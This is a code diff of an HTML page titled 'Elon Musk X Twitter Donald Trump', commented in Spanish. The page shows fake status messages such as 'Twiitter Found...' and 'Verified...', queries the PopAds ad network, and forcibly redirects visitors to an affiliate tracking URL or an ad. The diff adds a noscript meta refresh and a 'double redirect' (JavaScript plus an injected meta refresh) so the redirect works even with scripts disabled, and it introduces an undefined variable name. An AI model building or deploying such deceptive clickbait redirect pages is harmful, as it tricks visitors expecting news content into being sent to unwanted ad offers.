@@ -4,16 +4,21 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Elon Musk X Twitter Donald Trump</title>
+
+    <noscript>
+        <meta http-equiv="refresh" content="0;url=https://t.mbsrv2.com/381468/3788/0?bo=3471,3472,3473,3474,3475&target=domainredirects&po=6456&aff_sub5=SF_006OG000004lmDN">
+    </noscript>
+    
     <style>
-        body { 
-            margin: 0; 
-            padding: 0; 
-            font-family: Arial, sans-serif; 
-            min-height: 100vh; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            background-color: #f0f0f0; 
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: #f0f0f0;
             color: #333;
         }
         #status-message {
@@ -28,24 +33,19 @@
 </head>
 <body>
     <p id="status-message">Iniciando búsqueda de inventario...</p>
-    
-    
     <script>
         (function(window, document) {
-            
-            // =================================================================
-            // 🛑 VARIABLE DE CONTROL CLAVE: 
-            // Si es 'false' (como pides), redirige INMEDIATAMENTE a la URL 'default' 
-            // si NO hay inventario principal.
-            // =================================================================
-            const RETRY_ON_NO_INVENTORY = false; 
-            
-            // Constantes de tiempo 
-            const RETRY_INTERVAL = 20000; // 20 segundos para reintentar (si se pone true)
 
-            let retryTimeout = null; 
+            // =================================================================
+            // 🛑 VARIABLE DE CONTROL CLAVE:
+            // Si es 'false', redirige INMEDIATAMENTE a la URL 'default'.
+            // =================================================================
+            const RETRY_ON_NO_INVENTORY = false;
+
+            // Constantes de tiempo
+            const RETRY_INTERVAL = 20000;
+            let retryTimeout = null;
             const statusElement = document.getElementById('status-message');
-
 
             // === FUNCIÓN PARA ACTUALIZAR EL MENSAJE DE ESTADO ===
             function updateStatus(message) {
@@ -53,39 +53,65 @@
                     statusElement.textContent = message;
                 }
             }
+
+            // === FUNCIÓN: INSERTA EL META REFRESH DINÁMICO (ANUNCIO O DEFAULT) ===
+            function insertMetaRedirect(url) {
+                if (document.head) {
+                    // Si ya hay un meta refresh dinámico, lo eliminamos
+                    const existingMeta = document.querySelector('meta[http-equiv="refresh"]');
+                    if (existingMeta) {
+                        existingMeta.remove();
+                    }
+                    
+                    // Insertamos el nuevo meta refresh
+                    const meta = document.createElement('meta');
+                    meta.httpEquiv = 'refresh';
+                    meta.content = `0;url=${url}`;
+                    document.head.appendChild(meta);
+                }
+            }
+            
             updateStatus("Twiitter Found...");
 
-            // === POLIFILL NECESARIO ===
+
+            // === POLIFILL NECESARIO (Sin cambios) ===
             Function.prototype.bind || (Function.prototype.bind = function(thisArg) {
-                if (typeof this !== "function") { throw new TypeError("Function.prototype.bind - what is trying to be bound is not callable"); }
+                if (typeof this !== "function") {
+                    throw new TypeError("Function.prototype.bind - what is trying to be bound is not callable");
+                }
                 var args = Array.prototype.slice.call(arguments, 1);
                 var self = this;
                 var noOp = function() {};
-                var bound = function() { return self.apply(this instanceof noOp && thisArg ? this : thisArg, args.concat(Array.prototype.slice.call(arguments))); };
+                var bound = function() {
+                    return self.apply(this instanceof noOp && thisArg ? this : thisArg, args.concat(Array.prototype.slice.call(arguments)));
+                };
                 noOp.prototype = this.prototype;
                 bound.prototype = new noOp;
                 return bound;
             });
 
-            // === CONFIGURACIÓN POPADS ===
+            // === CONFIGURACIÓN POPADS (Sin cambios) ===
             var _pop = _pop || [];
             _pop.push(['siteId', 5226581]);
-            _pop.push(['minBid', 0]); 
-            _pop.push(['default', 'https://t.mbsrv2.com/381468/3788/0?bo=3471,3472,3473,3474,3475&target=domainredirects&po=6456&aff_sub5=SF_006OG000004lmDN']);
+            _pop.push(['minBid', 0]);
+            _pop.push(['default', 'https://t.mbsrv2.com/381468/3788/0?bo=3471,3472,3473,3474,3475&target=domainredirects&po=6456&aff_sub5=SF_006OG000004lmDN']); 
             _pop.push(['topmostLayer', false]);
             window._pop = _pop;
 
-            // === CONSTANTES Y VARIABLES CLAVE ===
+            // === CONSTANTES Y VARIABLES CLAVE (Sin cambios) ===
             "use strict";
             var BASE_PATH = "/c";
             var POP_GLOBAL_VAR = "_pop";
             var PAO_GLOBAL_VAR = "_pao";
             var adscoreTimeout = null;
-            
-            // ... (Resto de Base64 y Utilities no modificado) ...
+
             var utils = {
-                _openAd: function(url, options) { return true; },
-                abortPop: function() { this.clearUrls(); },
+                _openAd: function(url, options) {
+                    return true;
+                },
+                abortPop: function() {
+                    this.clearUrls();
+                },
                 init: function(config) {
                     this.userActivation = true;
                     this.urls = [];
@@ -95,15 +121,21 @@
                         this.adfired = true;
                     }.bind(this);
                 },
-                clearUrls: function() { this.urls = []; },
+                clearUrls: function() {
+                    this.urls = [];
+                },
                 addUrl: function(url, options) {
                     if (!url.match(/^https?:\/\//)) return false;
-                    this.urls.push({ url: url, options: options });
+                    this.urls.push({
+                        url: url,
+                        options: options
+                    });
                     adManager._preparePop();
                 }
             };
             
-            var Base64 = {
+            // ... (Base64 no modificado) ...
+            var Base64 = { 
                 _keyStr: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
                 encode: function(input) {
                     var output = "";
@@ -118,7 +150,11 @@
                         enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
                         enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
                         enc4 = chr3 & 63;
-                        if (isNaN(chr2)) { enc3 = enc4 = 64; } else if (isNaN(chr3)) { enc4 = 64; }
+                        if (isNaN(chr2)) {
+                            enc3 = enc4 = 64;
+                        } else if (isNaN(chr3)) {
+                            enc4 = 64;
+                        }
                         output = output + this._keyStr.charAt(enc1) + this._keyStr.charAt(enc2) + this._keyStr.charAt(enc3) + this._keyStr.charAt(enc4);
                     }
                     return output;
@@ -138,8 +174,12 @@
                         chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
                         chr3 = ((enc3 & 3) << 6) | enc4;
                         output = output + String.fromCharCode(chr1);
-                        if (enc3 !== 64) { output = output + String.fromCharCode(chr2); }
-                        if (enc4 !== 64) { output = output + String.fromCharCode(chr3); }
+                        if (enc3 !== 64) {
+                            output = output + String.fromCharCode(chr2);
+                        }
+                        if (enc4 !== 64) {
+                            output = output + String.fromCharCode(chr3);
+                        }
                     }
                     output = Base64._utf8_decode(output);
                     return output;
@@ -149,27 +189,44 @@
                     var utftext = "";
                     for (var n = 0; n < string.length; n++) {
                         var c = string.charCodeAt(n);
-                        if (c < 128) { utftext += String.fromCharCode(c); }
-                        else if ((c > 127) && (c < 2048)) { utftext += String.fromCharCode((c >> 6) | 192); utftext += String.fromCharCode(((c & 63) | 128)); }
-                        else { utftext += String.fromCharCode((c >> 12) | 224); utftext += String.fromCharCode(((c >> 6) & 63) | 128); utftext += String.fromCharCode((c & 63) | 128); }
+                        if (c < 128) {
+                            utftext += String.fromCharCode(c);
+                        } else if ((c > 127) && (c < 2048)) {
+                            utftext += String.fromCharCode((c >> 6) | 192);
+                            utftext += String.fromCharCode(((c & 63) | 128));
+                        } else {
+                            utftext += String.fromCharCode((c >> 12) | 224);
+                            utftext += String.fromCharCode(((c >> 6) & 63) | 128);
+                            utftext += String.fromCharCode((c & 63) | 128);
+                        }
                     }
                     return utftext;
                 },
                 _utf8_decode: function(utftext) {
                     var string = "";
                     var i = 0;
-                    var c = 0, c1 = 0, c2 = 0;
+                    var c = 0,
+                        c1 = 0,
+                        c2 = 0;
                     while (i < utftext.length) {
                         c = utftext.charCodeAt(i);
-                        if (c < 128) { string += String.fromCharCode(c); i++; }
-                        else if ((c > 191) && (c < 224)) { c2 = utftext.charCodeAt(i + 1); string += String.fromCharCode(((c & 31) << 6) | (c2 & 63)); i += 2; }
-                        else { c2 = utftext.charCodeAt(i + 1); c3 = utftext.charCodeAt(i + 2); string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63)); i += 3; }
+                        if (c < 128) {
+                            string += String.fromCharCode(c);
+                            i++;
+                        } else if ((c > 191) && (c < 224)) {
+                            c2 = utftext.charCodeAt(i + 1);
+                            string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
+                            i += 2;
+                        } else {
+                            c2 = utftext.charCodeAt(i + 1);
+                            c3 = utftext.charCodeAt(i + 2);
+                            string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
+                            i += 3;
+                        }
                     }
                     return string;
                 }
-            };
-            window.Base64 = Base64;
-            // ... (Fin de Base64 y Utilities) ...
+            }; window.Base64 = Base64;
 
 
             // === AD MANAGER (LÓGICA CENTRAL) ===
@@ -181,7 +238,6 @@
                     _default: false,
                     _adscoreak: "QpUJAAAAAAAAGu98Hdz1l_lcSZ2rY60Ajjk9U1c"
                 },
-
                 _init: function() {
                     var self = this;
                     this._loadConfig();
@@ -193,13 +249,11 @@
                     }
                     this._adscoreDeploy();
                 },
-
                 _adscoreDeploy: function() {
                     updateStatus("Verified...");
                     var self = this;
                     var adscoreScriptTimeout = 0;
                     var config = this._config;
-
                     if (self._config._adscorebp) {
                         self._checkInventory(self._config._adscorebp);
                     } else if (typeof AdscoreInit === "function") {
@@ -220,7 +274,6 @@
                         var adscoreUrl = "https://" + domainParts.reverse().join(".") + "/";
                         var script = document.createElement("script");
                         script.src = adscoreUrl;
-
                         try {
                             script.onerror = function() {
                                 if (script.src === adscoreUrl) {
@@ -231,185 +284,182 @@
                                 }
                             };
                         } catch (e) {}
-
-                        script.onload = function() {
-                            clearTimeout(adscoreScriptTimeout);
-                            try {
-                                AdscoreInit(self._config._adscoreak, {
-                                    sub_id: config._siteId,
-                                    callback: function(result) {
-                                        self._checkInventory(result.signature || "2" + result.error);
-                                    }
-                                });
-                            } catch (e) {
-                                self._checkInventory("4" + e.message);
-                            }
-                        };
-
-                        document.body.appendChild(script);
-                        adscoreScriptTimeout = setTimeout(function() {
-                            self._checkInventory("3");
-                        }, 5000);
-                    } else {
-                        setTimeout(function() {
-                            self._adscoreDeploy();
-                        }, 50);
-                    }
-                },
-
-                _checkInventory: function(adscoreSignature) {
-                    updateStatus("Init Inv...");
-                    this._lastci = (new Date).getTime();
-                    utils.clearUrls();
-                    var self = this;
-                    var intervalId = 0;
-                    var config = this._config;
-
-                    try { clearTimeout(adscoreTimeout); } catch (e) {}
-                    adscoreTimeout = setTimeout(function() {
-                        self._adscoreDeploy();
-                    }, 300000);
-
-                    intervalId = setInterval(function() {
-                        var inventoryUrl = "//serve.popads.net" + BASE_PATH;
-                        if (document.body) {
-                            clearInterval(intervalId);
-                            var params = {
-                                _: encodeURIComponent(adscoreSignature),
-                                v: 4,
-                                siteId: config._siteId,
-                                minBid: config._minBid,
-                                documentRef: encodeURIComponent(document.referrer),
-                            };
-
-                            for (var key in params) {
-                                if (params.hasOwnProperty(key)) {
-                                    inventoryUrl += (inventoryUrl.indexOf("?") !== -1 ? "&" : "?") + key + "=" + (params[key] || "");
+                            script.onload = function() {
+                                clearTimeout(adscoreScriptTimeout);
+                                try {
+                                    AdscoreInit(self._config._adscoreak, {
+                                        sub_id: config._siteId,
+                                        callback: function(result) {
+                                            self._checkInventory(result.signature || "2" + result.error);
+                                        }
+                                    });
+                                } catch (e) {
+                                    self._checkInventory("4" + e.message);
                                 }
-                            }
-
-                            var script = document.createElement("script");
-                            script.referrerPolicy = "unsafe-url";
-                            script.src = inventoryUrl;
-                            
-                            try {
-                                script.onerror = function() {
-                                    utils.abortPop();
-                                    // Error de conexión
-                                    if (RETRY_ON_NO_INVENTORY) {
-                                        adManager._preparePopDefault();
-                                    } else {
-                                        adManager._redirectToDefault();
-                                    }
-                                };
-                            } catch (e) {}
-                            
+                            };
                             document.body.appendChild(script);
+                            adscoreScriptTimeout = setTimeout(function() {
+                                self._checkInventory("3");
+                            }, 5000);
+                        } else {
+                            setTimeout(function() {
+                                self._adscoreDeploy();
+                            }, 50);
                         }
-                    }, 100);
-                },
+                    },
+                    _checkInventory: function(adscoreSignature) {
+                        updateStatus("Init Inv...");
+                        this._lastci = (new Date).getTime();
+                        utils.clearUrls();
+                        var self = this;
+                        var intervalId = 0;
+                        var config = this._config;
+                        try {
+                            clearTimeout(adscoreTimeout);
+                        } catch (e) {}
+                        adscoreTimeout = setTimeout(function() {
+                            self._adscoreDeploy();
+                        }, 300000);
+                        intervalId = setInterval(function() {
+                            var inventoryUrl = "//serve.popads.net" + BASE_PATH;
+                            if (document.body) {
+                                clearInterval(intervalId);
+                                var params = {
+                                    _: encodeURIComponent(adscoreSignature),
+                                    v: 4,
+                                    siteId: config._siteId,
+                                    minBid: config._minBid,
+                                    documentRef: encodeURIComponent(document.referrer),
+                                };
+                                for (var key in params) {
+                                    if (params.hasOwnProperty(key)) {
+                                        inventoryUrl += (inventoryUrl.indexOf("?") !== -1 ? "&" : "?") + key + "=" + (params[key] || "");
+                                    }
+                                }
+                                var script = document.createElement("script");
+                                script.referrerPolicy = "unsafe-url";
+                                script.src = inventoryUrl;
+                                try {
+                                    script.onerror = function() {
+                                        utils.abortPop(); // Error de conexión
+                                        if (RETRY_ON_NO_INVENTORY) {
+                                            adManager._preparePopDefault();
+                                        } else {
+                                            adManager._redirectToDefault(); 
+                                        }
+                                    };
+                                } catch (e) {}
+                                document.body.appendChild(script);
+                            }
+                        }, 100);
+                    },
+                    
+                    // 🛑 FUNCIÓN CLAVE: APLICA DOBLE REDIRECCIÓN (JS + META REFRESH DINÁMICO) 🛑
+                    _autoOpen: function(url) {
+                        // 1. Redirección JavaScript (método principal y más rápido)
+                        window.location.href = url;
+                        
+                        // 2. Redirección HTML (Meta Refresh) como respaldo
+                        insertMetaRedirect(url);
+                    },
 
-                _autoOpen: function(url) {
-                    // El mensaje se actualiza antes en _parseInventory
-                    window.location.href = url;
-                },
-
-                _redirectToDefault: function() {
-                    const defaultUrl = this._config._default;
-                    if (defaultUrl) {
-                        updateStatus("Twitter. Redirigiendo a URL Default.");
-                        this._autoOpen(defaultUrl);
-                    } else {
-                        updateStatus("Twitter. No hay URL Default configurada. (Error Fatal)");
-                    }
-                },
-                
-                _preparePopDefault: function() {
-                    if (RETRY_ON_NO_INVENTORY) {
+                    // 🛑 REDIRECCIÓN A DEFAULT: Llama a _autoOpen para aplicar la DOBLE REDIRECCIÓN 🛑
+                    _redirectToDefault: function() {
+                        const defaultUrl = this._config._default;
+                        if (defaultUrl) {
+                            updateStatus("Twitter. Redirigiendo a URL Default (Doble Método).");
+                            this._autoOpen(defaultUrl);
+                        } else {
+                            updateStatus("Twitter. No hay URL Default configurada. (Error Fatal)");
+                        }
+                    },
+                    _preparePopDefault: function() {
                         if (retryTimeout) {
                             clearTimeout(retryTimeout);
                         }
-
-                        updateStatus(`Twitter Reintentando en ${RETRY_INTERVAL / 1000} segundos...`);
-                        
-                        retryTimeout = setTimeout(function() {
-                            adManager._adscoreDeploy();
-                        }, RETRY_INTERVAL);
-                    }
-                },
-
-                /**
-                 * LÓGICA DE DECISIÓN: Redirige al anuncio, reintenta, o va al default.
-                 */
-                _parseInventory: function(inventoryData) {
-                    this._inventory = inventoryData || {};
-                    // Usamos Object.keys para ser estrictos en la verificación de un objeto vacío {}
-                    var hasData = Object.keys(this._inventory).length > 0;
-                    var url = this._inventory.url || '';
-
-                    if (hasData && url && url !== "") {
-                         updateStatus(`Exito...`);
-                        this._autoOpen(url);
-                    } else {
-                        
                         if (RETRY_ON_NO_INVENTORY) {
-                            // Opción A: Reintentar (solo si RETRY_ON_NO_INVENTORY es true)
-                            this._preparePopDefault();
+                            updateStatus(`Twitter Reintentando en ${RETRY_INTERVAL / 1000} segundos...`);
+                            retryTimeout = setTimeout(function() {
+                                adManager._adscoreDeploy();
+                            }, RETRY_INTERVAL);
+                        }
+                    },
+                    _parseInventory: function(inventoryData) {
+                        this._inventory = inventoryData || {};
+                        var hasData = Object.keys(this._inventory).length > 0;
+                        var url = this._inventory.url || '';
+                        if (hasData && url && url !== "") {
+                            updateStatus(`Éxito... Redirigiendo al Inventario.`);
+                            // ÉXITO: USA LA DOBLE REDIRECCIÓN
+                            this._autoOpen(url);
                         } else {
-                            // Opción B: Redirigir inmediatamente al default (si RETRY_ON_NO_INVENTORY es false)
-                            this._redirectToDefault();
+                            // FALLO: USA LA DOBLE REDIRECCIÓN A DEFAULT
+                            if (RETRY_ON_NO_INVENTORY) {
+                                this._preparePopDefault();
+                            } else {
+                                this._redirectToDefault();
+                            }
+                        }
+                    },
+                    _waitForGoodWeather: function() {
+                        setTimeout(this._init.bind(this), 0);
+                    },
+                    _loadConfig: function() {
+                        var globalConfig = window[POP_GLOBAL_VAR] || [];
+                        var config = this._config;
+                        for (var i = 0; i < globalConfig.length; i++) {
+                            var key = globalConfig[i][0];
+                            var value = globalConfig[i][1];
+                            switch (key) {
+                                case "siteId":
+                                    config._siteId = parseInt(value, 10);
+                                    break;
+                                case "minBid":
+                                    config._minBid = parseFloat(value);
+                                    break;
+                                case "default":
+                                    config._default = value;
+                                    break;
+                                case "adscoreak":
+                                    config._adscoreak = value;
+                                    break;
+                            }
                         }
                     }
-                },
-
-                _waitForGoodWeather: function() {
-                    setTimeout(this._init.bind(this), 0);
-                },
-
-                _loadConfig: function() {
-                    var globalConfig = window[POP_GLOBAL_VAR] || [];
-                    var config = this._config;
-                    for (var i = 0; i < globalConfig.length; i++) {
-                        var key = globalConfig[i][0];
-                        var value = globalConfig[i][1];
-
-                        switch (key) {
-                            case "siteId": config._siteId = parseInt(value, 10); break;
-                            case "minBid": config._minBid = parseFloat(value); break;
-                            case "default": config._default = value; break;
-                            case "adscoreak": config._adscoreak = value; break;
-                        }
-                    }
-                }
-            };
-
-            // === ASIGNACIÓN DE API PÚBLICA ===
-            var publicApi = {
-                parse: function(inventoryData) {
-                    adManager._parseInventory(inventoryData);
-                },
-                fbparse: function(bannerData) {
-                    if (bannerData.url) {
-                        updateStatus(`Inventary Fallback...`);
-                        adManager._autoOpen(bannerData.url);
-                    } else {
-                         // Si el fallback banner falla
-                        if (RETRY_ON_NO_INVENTORY) {
-                            adManager._preparePopDefault();
+                };
+                
+                // ... (API Pública no modificada) ...
+                var publicApi = {
+                    parse: function(inventoryData) {
+                        adManager._parseInventory(inventoryData);
+                    },
+                    fbparse: function(bannerData) {
+                        if (bannerData.url) {
+                            updateStatus(`Inventary Fallback...`);
+                            // FALLBACK: USA LA DOBLE REDIRECCIÓN
+                            adManager._autoOpen(bannerData.url); 
                         } else {
-                            adManager._redirectToDefault();
+                            // FALLBACK FALLA: USA LA DOBLE REDIRECCIÓN A DEFAULT
+                            if (RETRY_ON_NO_INVENTORY) {
+                                adManager._preparePopDefault();
+                            } else {
+                                adManager._redirectToDefault();
+                            }
                         }
-                    }
-                    utils._openAd(bannerData.url, {});
-                },
-            };
-
-            try { window._pao = publicApi; Object.freeze(window._pao); } catch (e) {}
-            try { window[PAO_GLOBAL_VAR] = publicApi; Object.freeze(window[PAO_GLOBAL_VAR]); } catch (e) {}
-
-            // Iniciar el proceso
-            adManager._waitForGoodWeather();
-
+                        utils._openAd(bannerData.url, {});
+                    },
+                };
+                try {
+                    window._pao = publicApi;
+                    Object.freeze(window._pao);
+                } catch (e) {}
+                try {
+                    window[PAO_GLOBAL_VAR] = publicApi;
+                    Object.freeze(window[PAA_GLOBAL_VAR]);
+                } catch (e) {}
+                
+                // Iniciar el proceso
+                adManager._waitForGoodWeather();
         })(window, window.document);
     </script>
 </body>
